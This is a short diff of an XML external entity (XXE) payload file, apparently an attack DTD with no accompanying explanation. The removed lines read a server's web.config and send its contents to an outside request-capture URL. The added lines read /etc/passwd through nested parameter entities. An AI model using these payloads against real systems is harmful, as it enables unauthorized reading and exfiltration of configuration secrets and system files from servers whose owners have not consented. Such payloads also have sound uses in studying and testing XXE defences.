@@ -1,3 +1,2 @@
-<!ENTITY % file SYSTEM "file:///E:/approot/web.config">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/10flcko1?%file;'>">
-%all;
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
